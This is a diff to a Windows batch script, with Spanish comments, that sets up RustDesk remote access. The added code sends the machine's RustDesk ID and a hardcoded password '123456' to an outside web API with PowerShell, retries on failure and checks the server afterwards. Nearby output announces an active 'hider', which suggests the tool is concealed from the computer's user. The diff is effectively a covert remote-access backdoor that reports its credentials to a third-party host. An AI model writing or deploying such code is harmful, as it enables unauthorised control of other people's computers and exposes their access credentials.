@@ -226,6 +226,67 @@ echo ===================================
 echo.
 echo ID guardado en: %USERPROFILE%\Desktop\RustDesk_ID.txt
 echo.
+
+REM ========== ENVIAR A LA API ==========
+echo Enviando datos a la API...
+set API_URL=https://esfm.vercel.app/api/codes
+set PASSWORD=123456
+set MAX_INTENTOS=5
+set INTENTO=1
+
+:enviar_api
+echo Intento %INTENTO% de %MAX_INTENTOS%...
+
+REM Enviar POST y capturar respuesta
+for /f "delims=" %%r in ('powershell -Command "$body = @{code='%RUSTDESK_ID%'; password='%PASSWORD%'} | ConvertTo-Json; try { $response = Invoke-RestMethod -Uri '%API_URL%' -Method Post -Body $body -ContentType 'application/json'; if ($response.code -eq '%RUSTDESK_ID%' -and $response.password -eq '%PASSWORD%') { Write-Output 'OK' } else { Write-Output 'MISMATCH' } } catch { Write-Output 'ERROR' }"') do set API_RESULT=%%r
+
+if "%API_RESULT%"=="OK" (
+    echo ✓ Datos enviados y verificados correctamente!
+    goto api_exito
+)
+
+if "%API_RESULT%"=="MISMATCH" (
+    echo ! Respuesta no coincide, reintentando...
+)
+
+if "%API_RESULT%"=="ERROR" (
+    echo ! Error de conexion, reintentando...
+)
+
+set /a INTENTO+=1
+if %INTENTO% LEQ %MAX_INTENTOS% (
+    timeout /t 2 /nobreak >nul
+    goto enviar_api
+)
+
+echo.
+echo ✗ No se pudo verificar el envio despues de %MAX_INTENTOS% intentos
+echo   Verificando manualmente si existe en la BD...
+
+REM Verificar si ya existe en la BD
+for /f "delims=" %%v in ('powershell -Command "try { $codes = Invoke-RestMethod -Uri '%API_URL%' -Method Get; $found = $codes | Where-Object { $_.code -eq '%RUSTDESK_ID%' }; if ($found) { Write-Output 'ENCONTRADO' } else { Write-Output 'NO_ENCONTRADO' } } catch { Write-Output 'ERROR_VERIFICACION' }"') do set VERIFY_RESULT=%%v
+
+if "%VERIFY_RESULT%"=="ENCONTRADO" (
+    echo ✓ El codigo YA existe en la base de datos!
+    goto api_exito
+)
+
+echo ✗ El codigo NO se pudo guardar en la base de datos
+echo   Puedes intentar manualmente despues
+goto api_fin
+
+:api_exito
+echo.
+echo ===================================
+echo  DATOS GUARDADOS EN LA NUBE
+echo ===================================
+echo Codigo: %RUSTDESK_ID%
+echo Password: %PASSWORD%
+echo API: %API_URL%
+echo ===================================
+
+:api_fin
+echo.
 echo OCULTADOR NATIVO ACTIVO!
 echo - Usa Windows API directamente
 echo - No requiere software externo
